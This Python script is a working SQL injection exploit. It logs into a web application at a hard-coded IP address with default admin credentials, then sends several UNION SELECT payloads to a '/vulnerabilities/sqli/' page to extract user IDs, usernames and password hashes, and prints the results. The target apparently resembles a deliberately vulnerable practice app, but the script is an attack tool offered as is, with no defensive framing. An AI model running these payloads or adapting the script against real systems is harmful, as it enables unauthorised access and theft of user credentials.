
import subprocess
import re
from html import unescape

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in")

# Step 3: Extract all users with UNION-based SQL injection
# The display format is: ID: X<br />First name: Y<br />Surname: Z
# So we need to inject data that will display: userid | username | password as ID, first_name as First name, last_name as Surname

payloads = [
    "1' UNION SELECT CONCAT(user_id,'|',user,'|',password) as user_id, first_name, last_name FROM users WHERE user_id>0-- -",
    "999 UNION SELECT CONCAT(user_id,'|',user,'|',password), first_name, last_name FROM users-- -",
    "999' UNION SELECT GROUP_CONCAT(CONCAT(user_id,'|',user,'|',password)), 'AllUsers', 'Listed' FROM users-- -",
]

print("\n[*] Attempting to extract user data with password hashes...\n")

all_users = []

for payload in payloads:
    print(f"[*] Testing payload: {payload[:80]}...")
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        '-d', f'id={payload}&Submit=Submit',
        'http://31.97.117.123/vulnerabilities/sqli/'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Look for pre section
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        section_text = unescape(section)
        
        # Skip if it's an error
        if "The used SELECT" in section_text or "error" in section_text.lower():
            print(f"[-] SQL error: {section_text[:100]}")
            continue
        
        print(f"[+] Got response:")
        print(section_text)
        print()
        
        # Extract user info
        if '|' in section_text or 'ID' in section_text:
            all_users.append(section_text)

if all_users:
    print("\n" + "="*80)
    print("[+] EXTRACTED USER DATA:")
    print("="*80)
    for user_data in all_users:
        print(user_data)
        print()

